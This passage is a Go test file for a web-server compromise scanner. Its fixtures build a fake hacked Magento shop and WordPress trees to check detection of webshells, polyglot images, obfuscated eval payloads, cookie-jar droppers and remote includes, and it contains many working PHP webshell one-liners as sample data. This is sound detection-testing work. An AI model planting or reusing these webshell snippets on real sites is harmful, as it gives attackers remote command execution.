package web

import (
	"bytes"
	"context"
	"fmt"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"testing/fstest"

	"github.com/cpibia/tripwatch/internal/collector"
	"github.com/cpibia/tripwatch/internal/discovery"
)

func text(s string) *fstest.MapFile { return &fstest.MapFile{Data: []byte(s), Mode: 0o644} }

const nginxConf = `
http {
    server {
        server_name www.commerce.example.com;
        root /var/www/commerce/pub;
        location /media/custom_options/ { deny all; }
        location ~ ^/(index|get|errors/503|adminer)\.php$ { fastcgi_pass fastcgi_backend; }
        location ~* \.php$ { deny all; }
    }
}
`

// compromisedShop reproduces the web artefacts of a real Magento compromise.
func compromisedShop() fstest.MapFS {
	gif := append([]byte("GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04"), []byte("<?php system($_GET['c']); ?>")...)
	encoded := strings.Repeat("QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo=", 200)

	fsys := fstest.MapFS{
		"etc/nginx/nginx.conf":                                            text(nginxConf),
		"var/www/commerce/bin/magento":                                    text("#!/usr/bin/env php"),
		"var/www/commerce/app/etc/di.xml":                                 text("<config/>"),
		"var/www/commerce/app/code/Acme/Fonts.php":                        text("<?php\n$font = '" + encoded + "';\n"),
		"var/www/commerce/pub/index.php":                                  text("<?php require __DIR__ . '/../app/bootstrap.php';"),
		"var/www/commerce/pub/adminer.php":                                text("<?php // database admin tool"),
		"var/www/commerce/pub/.htaccess":                                  text("Options -Indexes"),
		"var/www/commerce/pub/errors/503.php":                             text(`<?php if (isset($_POST['cmd'])) { system($_POST['cmd']); }`),
		"var/www/commerce/pub/helper.php":                                 text(`<?php eval(base64_decode($_GET['cm']));`),
		"var/www/commerce/pub/media/custom_options/quote/s/e/a1.php8":     text(`<?php echo 1;`),
		"var/www/commerce/pub/media/custom_options/quote/g/e/image_1.gif": {Data: gif, Mode: 0o644},
		"var/www/commerce/pub/media/customer_address/s/e/sess_4c1d": text(
			`_sf2_attributes|a:1:{s:1:"x";O:31:"GuzzleHttp\Cookie\FileCookieJar":1:{}}` +
				`[{"Expires":1,"Discard":false,"Value":"<?php eval($_POST[1]); ?>"}]`),
		"var/www/commerce/pub/media/catalog/product/a.jpg":                                       {Data: []byte("\xff\xd8\xff\xe0 JFIF clean image"), Mode: 0o644},
		"var/www/commerce/pub/media/wysiwyg/js/app.js":                                           text("fetch('/get.php')"),
		"var/www/commerce/var/log/.data.tmp":                                                     text("card data"),
		"var/www/commerce/var/log/system.log":                                                    text("log"),
		"var/www/commerce/vendor/magento/module-checkout/Model/PaymentInformationManagement.php": text("<?php class PaymentInformationManagement {}"),
		"var/www/commerce/vendor/acme/files/Handler.php":                                         text("<?php class Handler {}"),
		"var/www/commerce/vendor/acme/lib/.loader.php":                                           text("<?php include 'x';"),
		"var/www/commerce/vendor/acme/lib/.php_cs.php":                                           text("<?php return [];"),
		"var/www/commerce/vendor/acme/sniffer/tests/Fixtures/.hidden/.HiddenSniff.php":           text("<?php class HiddenSniff {}"),
		"var/www/commerce/vendor/acme/sniffer/tests/Fixtures/.shell.php":                         text(`<?php eval(base64_decode($_GET['c']));`),
		"var/www/commerce/.git/HEAD":                                                             text("ref: refs/heads/main"),
		"var/www/commerce/generated/link":                                                        {Data: []byte("../vendor"), Mode: 0o777 | 1<<27},
	}
	return fsys
}

func run(t *testing.T, fsys fstest.MapFS) Result {
	t.Helper()
	out, err := (&Collector{}).Collect(context.Background(), collector.Source{FS: fsys})
	if err != nil {
		t.Fatal(err)
	}
	return out.(Result)
}

func commerceReport(t *testing.T, res Result) AppReport {
	t.Helper()
	for _, a := range res.Apps {
		if a.Path == "/var/www/commerce" {
			return a
		}
	}
	t.Fatalf("commerce not found among %d apps", len(res.Apps))
	return AppReport{}
}

func TestFindings(t *testing.T) {
	app := commerceReport(t, run(t, compromisedShop()))

	type finding struct {
		kind, path string
		sigs       string
		reachable  bool
	}
	var got []finding
	for _, f := range app.Findings {
		got = append(got, finding{f.Kind, f.Path, strings.Join(f.Signatures, ","), f.Reachable})
	}
	want := []finding{
		{KindEncodedBlob, "/var/www/commerce/app/code/Acme/Fonts.php", "", false},
		{KindPolyglotImage, "/var/www/commerce/pub/media/custom_options/quote/g/e/image_1.gif", "", false},
		{KindScriptInUploads, "/var/www/commerce/pub/media/custom_options/quote/s/e/a1.php8", "", false},
		{KindCodeInUploads, "/var/www/commerce/pub/media/customer_address/s/e/sess_4c1d", "eval_request_input,cookie_jar_dropper", false},
		{KindSignature, "/var/www/commerce/pub/errors/503.php", "exec_request_input", true},
		{KindSignature, "/var/www/commerce/pub/helper.php", "eval_decoded_payload,eval_request_input", false},
		{KindHiddenInData, "/var/www/commerce/var/log/.data.tmp", "", false},
		{KindHiddenScript, "/var/www/commerce/vendor/acme/lib/.loader.php", "", false},
		{KindSignature, "/var/www/commerce/vendor/acme/sniffer/tests/Fixtures/.shell.php", "eval_decoded_payload,eval_request_input", false},
	}
	slices.SortFunc(got, func(a, b finding) int { return strings.Compare(a.path, b.path) })
	slices.SortFunc(want, func(a, b finding) int { return strings.Compare(a.path, b.path) })
	if !slices.Equal(got, want) {
		t.Errorf("findings:\n got  %+v\n want %+v", got, want)
	}

	if !slices.Contains(app.UploadDirs, "/var/www/commerce/pub/media") {
		t.Errorf("upload dirs = %v", app.UploadDirs)
	}
	wantReachable := []string{"/var/www/commerce/pub/adminer.php", "/var/www/commerce/pub/errors/503.php", "/var/www/commerce/pub/index.php"}
	if !slices.Equal(app.Reachable, wantReachable) || app.ReachableCount != 3 {
		t.Errorf("reachable = %v (%d), want %v", app.Reachable, app.ReachableCount, wantReachable)
	}
	if len(app.Overrides) != 1 || app.Overrides[0].Path != "/var/www/commerce/pub/.htaccess" {
		t.Errorf("overrides = %+v", app.Overrides)
	}
	if app.Framework != "magento" || !slices.Equal(app.Sites, []string{"www.commerce.example.com"}) {
		t.Errorf("app = %+v", app.Application)
	}
}

func TestTreeHashCoversCodeNotData(t *testing.T) {
	base := commerceReport(t, run(t, compromisedShop()))
	if len(base.TreeHash) != 64 || base.DirHashes["/var/www/commerce/vendor"] == "" {
		t.Fatalf("tree hash %q, dir hashes %v", base.TreeHash, base.DirHashes)
	}
	if _, ok := base.DirHashes["/var/www/commerce/vendor/magento/module-checkout"]; ok {
		t.Error("directory hashes deeper than two levels must not be reported")
	}

	skimmed := compromisedShop()
	skimmed["var/www/commerce/vendor/magento/module-checkout/Model/PaymentInformationManagement.php"] = text(
		"<?php class PaymentInformationManagement {} /*injected*/")
	changed := commerceReport(t, run(t, skimmed))
	if changed.TreeHash == base.TreeHash || changed.DirHashes["/var/www/commerce/vendor"] == base.DirHashes["/var/www/commerce/vendor"] {
		t.Error("a modified vendor file must change the tree hash")
	}
	if changed.DirHashes["/var/www/commerce/pub"] != base.DirHashes["/var/www/commerce/pub"] {
		t.Error("an unrelated directory hash changed")
	}

	uploaded := compromisedShop()
	uploaded["var/www/commerce/pub/media/catalog/product/b.jpg"] = text("\xff\xd8 new product photo")
	uploaded["var/www/commerce/var/log/system.log"] = text("more log lines")
	if got := commerceReport(t, run(t, uploaded)); got.TreeHash != base.TreeHash {
		t.Error("uploads and logs must not change the code tree hash")
	}
}

func TestLargePolyglotIsCaught(t *testing.T) {
	big := bytes.Repeat([]byte{0xAB}, maxInMemory+1024)
	fsys := compromisedShop()
	fsys["var/www/commerce/pub/media/big.png"] = &fstest.MapFile{Data: append(append([]byte("\x89PNG"), big...), []byte("<?php system('id');")...), Mode: 0o644}
	fsys["var/www/commerce/pub/media/clean.png"] = &fstest.MapFile{Data: append([]byte("\x89PNG"), big...), Mode: 0o644}

	app := commerceReport(t, run(t, fsys))
	var polyglots []string
	for _, f := range app.Findings {
		if f.Kind == KindPolyglotImage {
			polyglots = append(polyglots, f.Path)
		}
	}
	if !slices.Contains(polyglots, "/var/www/commerce/pub/media/big.png") || slices.Contains(polyglots, "/var/www/commerce/pub/media/clean.png") {
		t.Errorf("polyglots = %v", polyglots)
	}
}

func TestSignaturesIgnoreOrdinaryCode(t *testing.T) {
	clean := []string{
		`<?php $id = (int) $_GET['id']; echo htmlspecialchars($id);`,
		`<?php exec('ls -la', $out); // fixed command`,
		`<?php $data = base64_decode($payload); eval_config($data);`,
		`<?php preg_replace('/\s+/i', ' ', $s);`,
		`<?php $cb = $_POST['callback'] ?? 'json';`,
		"<?php\n/**\n * Reads `$_POST['menu']` and calls eval(base64_decode()) never.\n */\nfunction save() {}",
		"<?php // system($_GET['x']) is what an attacker would write\n# eval(gzinflate(x))\n$a = 1;",
		`<?php $msg = 'use // and # freely'; $url = "http://x/#a";`,
		`<?php $method = 'get' . ucfirst($field); $this->$method();`,
		`<?php $sep = "\x1f\x1e"; $bom = "\xEF\xBB\xBF"; $label = 'System' . ' settings';`,
		`<?php include __DIR__ . '/config.php'; require_once $root . '/vendor/autoload.php';`,
		`<?php $cmd = 'sys' . $suffix; $key = "exec_" . $id;`,
	}
	for _, c := range clean {
		if sigs := matchSignatures([]byte(c), true); len(sigs) != 0 {
			t.Errorf("%q matched %v", c, sigs)
		}
	}

	malicious := map[string]string{
		`<?php @eval(@base64_decode('ZWNobyAx'));`:                                                "eval_decoded_payload",
		`<?php PassThru($_REQUEST['x']);`:                                                         "exec_request_input",
		`<?php assert($_COOKIE['a']);`:                                                            "eval_request_input",
		`<?php $_GET['f']($_GET['a']);`:                                                           "request_input_as_function",
		"<?php echo `$_POST[c]`;":                                                                 "backtick_request_input",
		`<?php preg_replace('/.*/e', $_POST['x'], '');`:                                           "preg_replace_eval",
		`<?php $f = "sy"."stem"; $f($_GET["c"]);`:                                                 "obfuscated_function_name",
		`<?php $f = "\x73\x79\x73\x74\x65\x6d"; $f($_GET["c"]);`:                                  "obfuscated_function_name",
		`<?php $f = "\163\171\163\164\145\155"; @$f($c);`:                                         "obfuscated_function_name",
		`<?php $a = chr(97).chr(115).chr(115).chr(101).chr(114).chr(116); $a($_POST[1]);`:         "obfuscated_function_name",
		`<?php $k = "\x14\x0a\x06\x1a\x00\x18" ^ "gsuneu"; $k($_REQUEST["x"]);`:                   "obfuscated_function_name",
		`<?php $f = 'base' . '64_' . 'decode'; eval($f($p));`:                                     "obfuscated_function_name",
		`<?php if (isset($_COOKIE['t'])) { include('http://cdn.example.net/' . $_COOKIE['t']); }`: "remote_include",
		`<?php include($_GET['page']);`:                                                           "include_request_input",
		`<?php require 'php://input';`:                                                            "remote_include",
		`<?php eval(file_get_contents('https://x.example/p'));`:                                   "eval_remote_content",
		`<?php $GLOBALS['_fn']($_POST['a']);`:                                                     "globals_call",
	}
	for code, want := range malicious {
		if sigs := matchSignatures([]byte(code), true); !slices.Contains(sigs, want) {
			t.Errorf("%q matched %v, want %s", code, sigs, want)
		}
	}
}

func TestIsScript(t *testing.T) {
	for name, want := range map[string]bool{
		"shell.php": true, "x.phtml": true, "x.phar": true, "seg.php..png": true, "a.php.jpg": true,
		"index.jsp": true, "default.aspx": true, "photo.jpg": false, "style.css": false, "php.png": false,
		".psr-container.php.stub": false, "notes.php.txt": true,
	} {
		if got := isScript(name); got != want {
			t.Errorf("isScript(%q) = %v", name, got)
		}
	}
}

func TestNoApplications(t *testing.T) {
	res := run(t, fstest.MapFS{})
	if len(res.Apps) != 0 {
		t.Errorf("apps = %+v", res.Apps)
	}
}

// A cancelled scan returns what it has, marked as partial, instead of nothing.
func TestCancel(t *testing.T) {
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	out, err := (&Collector{}).Collect(ctx, collector.Source{FS: compromisedShop()})
	if err != nil {
		t.Fatal(err)
	}
	res := out.(Result)
	if len(res.Apps) == 0 || !res.Apps[0].Truncated || !slices.ContainsFunc(res.Issues, func(s string) bool { return strings.Contains(s, "not scanned") }) {
		t.Errorf("apps %d, issues %v", len(res.Apps), res.Issues)
	}
}

func TestStripPHPComments(t *testing.T) {
	src := "<?php\n$a = 'x // not a comment'; // comment\n/* block\n eval($_GET[1]) */$b = \"#[x]\"; # hash\n#[Attribute]\nclass X {} ?>tail"
	want := "<?php\n$a = 'x // not a comment'; \n$b = \"#[x]\"; \n#[Attribute]\nclass X {} ?>tail"
	if got := string(stripPHPComments([]byte(src))); got != want {
		t.Errorf("got  %q\nwant %q", got, want)
	}
	if got := string(stripPHPComments([]byte("<?php /* never closed"))); got != "<?php " {
		t.Errorf("unterminated comment: %q", got)
	}
}

func TestIsPlaceholder(t *testing.T) {
	for content, want := range map[string]bool{
		"<?php\n// Silence is golden.\n":        true,
		"<?php /* nothing */ ?>":                true,
		"":                                      true,
		"<?php echo 1;":                         false,
		"<?php // Silence\nsystem($_GET['c']);": false,
	} {
		if got := isPlaceholder([]byte(content)); got != want {
			t.Errorf("isPlaceholder(%q) = %v", content, got)
		}
	}
}

// Generic upload names only mean "uploads" right under the application or web root, and
// never for a stack whose profile names its upload directories.
func TestGenericUploadDirs(t *testing.T) {
	fsys := fstest.MapFS{
		"var/www/site/index.php":                          text("<?php echo 'home';"),
		"var/www/site/uploads/avatar.php":                 text("<?php echo 1;"),
		"var/www/site/uploads/index.php":                  text("<?php // Silence is golden."),
		"var/www/site/uploads/.cache.dat":                 text("x"),
		"var/www/site/lib/templates/media/uploader.phtml": text("<?php echo $block->x();"),
		"var/www/site/plugins/x/assets/img/index.php":     text("<?php echo 2;"),
		"var/www/blog/wp-includes/version.php":            text("<?php $wp_version = '6.6';"),
		"var/www/blog/wp-content/cache/page/index.php":    text("<?php echo 'cached';"),
		"var/www/blog/wp-content/uploads/2026/10/x.php":   text("<?php echo 3;"),
		"var/www/blog/media/legit.php":                    text("<?php echo 4;"),
	}
	res := run(t, fsys)

	var got []string
	for _, a := range res.Apps {
		for _, f := range a.Findings {
			got = append(got, f.Kind+" "+f.Path)
		}
	}
	slices.Sort(got)
	want := []string{
		KindScriptInUploads + " /var/www/blog/wp-content/uploads/2026/10/x.php",
		KindHiddenInData + " /var/www/site/uploads/.cache.dat",
		KindScriptInUploads + " /var/www/site/uploads/avatar.php",
	}
	slices.Sort(want)
	if !slices.Equal(got, want) {
		t.Errorf("findings:\n got  %v\n want %v", got, want)
	}
}

// A script in an upload directory is reported whatever its size, including files too large
// to load (padded past the in-memory limit) and files too large to hash (sparse, read only at
// the edges).
func TestLargeScriptsInUploads(t *testing.T) {
	padded := compromisedShop()
	padded["var/www/commerce/pub/media/catalog/big.php"] = text("<?php system($_GET['c']); ?>" + strings.Repeat(" ", maxInMemory+1))
	if !hasFinding(paddedReport(t, padded), KindScriptInUploads, "/var/www/commerce/pub/media/catalog/big.php") {
		t.Error("padded script in uploads not reported")
	}

	dir := t.TempDir()
	app := filepath.Join(dir, "var/www/site")
	if err := os.MkdirAll(filepath.Join(app, "uploads"), 0o750); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(app, "index.php"), []byte("<?php echo 1;"), 0o600); err != nil {
		t.Fatal(err)
	}
	huge := filepath.Join(app, "uploads/huge.php")
	if err := os.WriteFile(huge, []byte(`<?php eval(base64_decode($_POST['x']));`), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.Truncate(huge, collector.MaxHashSize+1<<20); err != nil {
		t.Fatal(err)
	}
	out, err := (&Collector{}).Collect(context.Background(), collector.NewSource(dir))
	if err != nil {
		t.Fatal(err)
	}
	var found *Finding
	for _, a := range out.(Result).Apps {
		for i, f := range a.Findings {
			if f.Path == "/var/www/site/uploads/huge.php" {
				found = &a.Findings[i]
			}
		}
	}
	if found == nil || found.Kind != KindScriptInUploads || !slices.Contains(found.Signatures, "eval_decoded_payload") {
		t.Errorf("sparse script in uploads = %+v", found)
	}
}

func paddedReport(t *testing.T, fsys fstest.MapFS) AppReport {
	t.Helper()
	return commerceReport(t, run(t, fsys))
}

func hasFinding(app AppReport, kind, p string) bool {
	return slices.ContainsFunc(app.Findings, func(f Finding) bool { return f.Kind == kind && f.Path == p })
}

// A generic marker above an application (a stray index.html in /var/www) must not replace the
// application's own profile: its upload and data directories still apply, and the outer
// directory does not report the same files a second time.
func TestGenericMarkerAboveApplication(t *testing.T) {
	fsys := compromisedShop()
	fsys["var/www/index.html"] = text("<h1>It works</h1>")
	delete(fsys, "etc/nginx/nginx.conf") // found by walking the disk, not through a site
	res := run(t, fsys)

	app := commerceReport(t, res)
	if app.Framework != "magento" {
		t.Fatalf("framework = %q", app.Framework)
	}
	for _, want := range []string{KindScriptInUploads, KindCodeInUploads, KindHiddenInData} {
		if !slices.ContainsFunc(app.Findings, func(f Finding) bool { return f.Kind == want }) {
			t.Errorf("%s lost under a generic parent", want)
		}
	}
	for _, a := range res.Apps {
		if a.Path == "/var/www" && (len(a.Findings) != 0 || a.Files != 1) {
			t.Errorf("outer application rescanned the inner one: %d files, findings %+v", a.Files, a.Findings)
		}
	}
}

func TestSymlinks(t *testing.T) {
	dir := t.TempDir()
	mk := func(p, content string) {
		t.Helper()
		full := filepath.Join(dir, p)
		if err := os.MkdirAll(filepath.Dir(full), 0o750); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(full, []byte(content), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	link := func(target, p string) {
		t.Helper()
		if err := os.Symlink(target, filepath.Join(dir, p)); err != nil {
			t.Fatal(err)
		}
	}
	mk("var/www/site/index.php", "<?php echo 1;")
	mk("var/www/site/uploads/photo.jpg", "\xff\xd8 photo")
	mk("dev/shm/s.php", `<?php system($_GET['c']);`)
	mk("srv/shared/config.php", "<?php return [];")
	link("../../../../dev/shm/s.php", "var/www/site/uploads/x.php")
	link("../../../srv/shared", "var/www/site/shared")
	link("photo.jpg", "var/www/site/uploads/latest.jpg")
	link("index.php", "var/www/site/home.php")

	out, err := (&Collector{}).Collect(context.Background(), collector.NewSource(dir))
	if err != nil {
		t.Fatal(err)
	}
	var got []string
	for _, a := range out.(Result).Apps {
		for _, f := range a.Findings {
			got = append(got, fmt.Sprintf("%s %s -> %s %v", f.Kind, f.Path, f.Target, f.Signatures))
		}
	}
	slices.Sort(got)
	want := []string{
		KindExternalSymlink + " /var/www/site/shared -> ../../../srv/shared []",
		KindSuspiciousSymlink + " /var/www/site/home.php -> index.php []",
		KindSuspiciousSymlink + " /var/www/site/uploads/latest.jpg -> photo.jpg []",
		KindSuspiciousSymlink + " /var/www/site/uploads/x.php -> ../../../../dev/shm/s.php [exec_request_input]",
	}
	if !slices.Equal(got, want) {
		t.Errorf("findings:\n got  %q\n want %q", got, want)
	}
}

type tree struct {
	t    *testing.T
	root string
}

func newTree(t *testing.T) *tree { return &tree{t: t, root: t.TempDir()} }

func (tr *tree) file(p, content string) {
	tr.t.Helper()
	full := filepath.Join(tr.root, p)
	if err := os.MkdirAll(filepath.Dir(full), 0o750); err != nil {
		tr.t.Fatal(err)
	}
	if err := os.WriteFile(full, []byte(content), 0o600); err != nil {
		tr.t.Fatal(err)
	}
}

func (tr *tree) link(target, p string) {
	tr.t.Helper()
	if err := os.Symlink(target, filepath.Join(tr.root, p)); err != nil {
		tr.t.Fatal(err)
	}
}

func (tr *tree) scan() Result {
	tr.t.Helper()
	out, err := (&Collector{}).Collect(context.Background(), collector.NewSource(tr.root))
	if err != nil {
		tr.t.Fatal(err)
	}
	return out.(Result)
}

func findingsOf(res Result) []string {
	var out []string
	for _, a := range res.Apps {
		for _, f := range a.Findings {
			out = append(out, f.Kind+" "+f.Path)
		}
	}
	slices.Sort(out)
	return out
}

// A CMS marker planted inside an upload directory makes that directory look like an
// application of its own; it must not take the upload directory out of the parent's scan.
func TestApplicationInsideUploads(t *testing.T) {
	tr := newTree(t)
	tr.file("var/www/site/index.php", "<?php echo 1;")
	tr.file("var/www/site/uploads/wp-includes/version.php", "<?php $wp_version = '6.6';")
	tr.file("var/www/site/uploads/shell.php", `<?php system($_GET['c']);`)

	got := findingsOf(tr.scan())
	for _, want := range []string{
		KindAppInData + " /var/www/site/uploads",
		KindScriptInUploads + " /var/www/site/uploads/shell.php",
	} {
		if !slices.Contains(got, want) {
			t.Errorf("missing %q in %v", want, got)
		}
	}
}

// What real sites keep in their trees and is no code that runs, next to the same names carrying
// code: logs behind an exit, archives of plugins, the metadata files macOS leaves in a zip, a
// CMS's version file, images saved without a name, pixels that happen to spell a short tag.
func TestFilesThatLookLikeCodeButRunNothing(t *testing.T) {
	tr := newTree(t)
	tr.file("var/www/blog/wp-includes/version.php", "<?php $wp_version = '6.6.2';")
	up := "var/www/blog/wp-content/uploads/"
	tr.file(up+"plugin/debug-log.php", "<?php exit; ?>\n[2026-10-28] request sent\n")
	tr.file(up+"plugin/guarded-then-code.php", "<?php exit; ?>\n<?php system($_GET['c']);")
	tr.file(up+"layouts/dance.php", "<?php\nreturn array(\n  'title' => 'Dance studio',\n  'content' => \"<div class='x'>[fusion_builder]</div>\",\n  'ratio' => 1.5, 'tags' => [true, null, -2],\n);\n")
	tr.file(up+"layouts/guarded.php", "<?php\n/**\n * Demo page.\n */\nif ( ! defined( 'ABSPATH' ) ) {\n\texit( 'Direct script access denied.' );\n}\n// Page.\n$page = array( 'title' => 'Bakery' );\n")
	tr.file(up+"layouts/guarded-then-code.php", "<?php\ndefined( 'ABSPATH' ) || exit;\nsystem($_GET['c']);\n")
	tr.file("var/www/blog/.redirects.php", "<?php\n$redirects = array(\n  '/old' => '/new',\n);\n")
	tr.file(up+"backup/site-dump", "-- MySQL dump 10.13\nINSERT INTO `wp_posts` VALUES (1,'<?php echo `date`; ?>');\n")
	tr.file(up+"layouts/prices.php", "<?php return array('price' => \"From $10 {per night}\", 'css' => \".a{color:red}\");")
	tr.file(up+"plugin/index.php", "Silence is golden.")
	tr.file(up+"layouts/function.php", "<?php\nfunction theme_page_science() {\n\treturn array( 'name' => 'Science', 'content' => '[fusion_builder_container]' );\n}\n")
	tr.file(up+"layouts/function-params.php", "<?php\nfunction theme_page_bakery( $demo = 'bakery', $args = array() ) {\n\treturn array( 'name' => 'Bakery' );\n}\n")
	tr.file(up+"layouts/function-hooked.php", "<?php\nfunction theme_page_winery() {\n\treturn array( 'name' => 'Winery' );\n}\nadd_filter( 'theme_pages', 'theme_page_winery', 10 );\n")
	tr.file(up+"layouts/hooked-builtin.php", "<?php\nfunction theme_page_z() {\n\treturn array();\n}\nadd_filter( 'the_content', 'system' );\n")
	tr.file(up+"layouts/function-called.php", "<?php\nfunction theme_page_x() {\n\treturn array();\n}\ntheme_page_x();\n")
	tr.file(up+"layouts/function-runs.php", "<?php\nfunction theme_page_y() {\n\tsystem($_GET['c']);\n}\n")
	tr.file(up+"layouts/call.php", "<?php return array('a' => system($_GET['c']));")
	tr.file(up+"layouts/variable.php", "<?php $f = 'system'; $f($_GET['c']);")
	tr.file(up+"layouts/interpolated.php", "<?php return array('a' => \"{$_GET['c']}\");")
	tr.file(up+"backup-plugin.zip", "PK\x03\x04\x14\x00<?php echo 'plugin';")
	tr.file(up+"dropper.zip", "PK\x03\x04\x14\x00<?php system($_GET['c']);")
	tr.file(up+".png", "\x89PNG\r\n\x1a\nIHDR")
	tr.file(up+".empty", "")
	tr.file(up+".secret", "notes")
	tr.file(up+"pixels.png", "\x89PNG\r\n\x1a\nIDAT<?=$x random")
	tr.file(up+"shell.png", "\x89PNG\r\n\x1a\nIDAT<?php echo 1;")
	tr.file(up+"clip.mp4", "\x00\x00\x00\x18ftypmp42<?php `x`")
	tr.file("var/www/blog/wp-content/plugins/kit/__MACOSX/._kit.php", "\x00\x05\x16\x07Mac OS X        ATTR")
	tr.file(up+"icons/pin.ico/__MACOSX/._pin.ico", "\x00\x05\x16\x07Mac OS X        ATTR")
	tr.file("var/www/blog/.dbVersion.php", "<?php $dbVersion = '8.0'; ?>")
	tr.file("var/www/blog/.loader.php", "<?php include $_GET['f'];")

	got := findingsOf(tr.scan())
	for _, want := range []string{
		KindScriptInUploads + " /" + up + "plugin/guarded-then-code.php",
		KindScriptInUploads + " /" + up + "layouts/call.php",
		KindScriptInUploads + " /" + up + "layouts/function-called.php",
		KindScriptInUploads + " /" + up + "layouts/hooked-builtin.php",
		KindScriptInUploads + " /" + up + "layouts/function-runs.php",
		KindScriptInUploads + " /" + up + "layouts/guarded-then-code.php",
		KindScriptInUploads + " /" + up + "layouts/variable.php",
		KindScriptInUploads + " /" + up + "layouts/interpolated.php",
		KindCodeInUploads + " /" + up + "dropper.zip",
		KindHiddenInData + " /" + up + ".secret",
		KindPolyglotImage + " /" + up + "shell.png",
		KindHiddenScript + " /var/www/blog/.loader.php",
	} {
		if !slices.Contains(got, want) {
			t.Errorf("missing %q", want)
		}
	}
	for _, name := range []string{"debug-log.php", "plugin/index.php", "dance.php", "layouts/function.php", "layouts/function-params.php", "layouts/function-hooked.php", "prices.php", "guarded.php", ".redirects.php", "site-dump", "backup-plugin.zip", "uploads/.png", ".empty", "pixels.png", "clip.mp4", "._kit.php", "._pin.ico", ".dbVersion.php"} {
		if slices.ContainsFunc(got, func(f string) bool { return strings.HasSuffix(f, name) }) {
			t.Errorf("%s reported: %v", name, got)
		}
	}
}

// A Capistrano deploy served through its current release: the releases kept for a rollback are
// no applications of their own, and the uploads every release links to the deploy's shared
// directory, which itself leads to the volume they live on, are scanned there, not reported as
// a suspicious link.
func TestCapistranoDeployWithSharedUploadsElsewhere(t *testing.T) {
	tr := newTree(t)
	tr.file("etc/nginx/nginx.conf", "http { server { server_name shop.example.com; root /var/www/shop; } }")
	for _, r := range []string{"1", "2"} {
		tr.file("var/www/deploy/releases/"+r+"/wp-includes/version.php", "<?php $wp_version = '6.6.2';")
		tr.file("var/www/deploy/releases/"+r+"/index.php", "<?php")
		tr.file("var/www/deploy/releases/"+r+"/wp-content/index.php", "<?php")
		tr.link("../../../shared/wp-content/uploads", "var/www/deploy/releases/"+r+"/wp-content/uploads")
	}
	tr.file("data/uploads/2026/shell.php", `<?php system($_GET['c']);`)
	tr.file("var/www/deploy/shared/wp-content/index.php", "<?php")
	// Relative links: outside Linux the test runs without confinement to the observed root.
	tr.link("../../../../../data/uploads", "var/www/deploy/shared/wp-content/uploads")
	tr.link("deploy/releases/2", "var/www/shop")

	res := tr.scan()
	var paths []string
	for _, a := range res.Apps {
		paths = append(paths, a.Path)
	}
	if !slices.Equal(paths, []string{"/var/www/shop"}) {
		t.Errorf("applications = %v", paths)
	}
	got := findingsOf(res)
	if !slices.Contains(got, KindScriptInUploads+" /data/uploads/2026/shell.php") || slices.ContainsFunc(got, func(f string) bool { return strings.HasPrefix(f, KindSuspiciousSymlink) }) {
		t.Errorf("findings = %v", got)
	}
}

// An application no profile describes says where it writes through its permissions: a script
// in a directory anyone may write to is a script in an upload directory, the same file in its
// code is not.
func TestWorldWritableDirectoryOfAnUnknownApplication(t *testing.T) {
	tr := newTree(t)
	tr.file("var/www/site/index.php", "<?php echo 1;")
	tr.file("var/www/site/template/page.php", "<?php echo 2;")
	tr.file("var/www/site/captcha/x.php", "<?php echo 3;")
	tr.file("var/www/site/web/core/lib/Drupal.php", "<?php const VERSION = '11.3.0';")
	tr.file("var/www/site/web/index.php", "<?php")
	for _, d := range []string{"captcha", "web"} {
		if err := os.Chmod(filepath.Join(tr.root, "var/www/site", d), 0o777); err != nil { //nolint:gosec // world-writable on purpose
			t.Fatal(err)
		}
	}

	res := tr.scan()
	got := findingsOf(res)
	if !slices.Contains(got, KindScriptInUploads+" /var/www/site/captcha/x.php") || slices.ContainsFunc(got, func(f string) bool { return strings.Contains(f, "template") }) {
		t.Errorf("findings = %v", got)
	}
	// The CMS nested in web/ is an application of its own, not an upload directory.
	if !slices.Contains(res.Apps[0].UploadDirs, "/var/www/site/captcha") || slices.Contains(res.Apps[0].UploadDirs, "/var/www/site/web") ||
		slices.ContainsFunc(got, func(f string) bool { return strings.HasPrefix(f, KindAppInData) }) {
		t.Errorf("upload directories = %v, findings %v", res.Apps[0].UploadDirs, got)
	}
}

// A network share mounted in an application, in its code or as its uploads, is another
// machine's and can stall the run: it is left out and said, the rest is scanned.
func TestNetworkMountsAreNotScanned(t *testing.T) {
	tr := newTree(t)
	tr.file("proc/1/mountinfo", "22 1 259:1 / / rw - ext4 /dev/root rw\n"+
		"90 22 0:50 / /var/www/site/resources/drive rw,nosuid - fuse.davfs https://dav.example.com rw\n"+
		"91 22 0:51 / /var/www/site/uploads rw,nosuid - nfs4 server:/export rw\n")
	tr.file("var/www/site/index.php", "<?php echo 1;")
	tr.file("var/www/site/x.php", `<?php system($_GET['c']);`)
	tr.file("var/www/site/resources/drive/a.php", `<?php system($_GET['c']);`)
	tr.file("var/www/site/uploads/b.php", `<?php system($_GET['c']);`)

	res := tr.scan()
	if got := findingsOf(res); len(got) != 1 || !strings.HasSuffix(got[0], " /var/www/site/x.php") {
		t.Errorf("findings = %v, want only the local script", got)
	}
	for _, want := range []string{"/var/www/site/resources/drive: fuse.davfs network filesystem, not scanned", "/var/www/site/uploads: nfs4 network filesystem, not scanned"} {
		if !slices.Contains(res.Issues, want) {
			t.Errorf("missing issue %q in %v", want, res.Issues)
		}
	}
}

// An upload directory that is a symlink to a shared directory is scanned through the link,
// and the link itself, the usual layout of release-based deploys, is not a finding.
func TestSymlinkedUploadDirectoryIsScanned(t *testing.T) {
	tr := newTree(t)
	tr.file("var/www/releases/5/index.php", "<?php echo 1;")
	tr.file("var/www/shared/uploads/2026/shell.php", `<?php system($_GET['c']);`)
	tr.link("../../shared/uploads", "var/www/releases/5/uploads")
	tr.link("../uploads", "var/www/shared/uploads/2026/loop")

	got := findingsOf(tr.scan())
	// Followed trees are walked by their real path.
	if !slices.Contains(got, KindScriptInUploads+" /var/www/shared/uploads/2026/shell.php") {
		t.Errorf("findings = %v", got)
	}
	if slices.Contains(got, KindSuspiciousSymlink+" /var/www/releases/5/uploads") {
		t.Errorf("the deploy link to the shared upload directory was reported: %v", got)
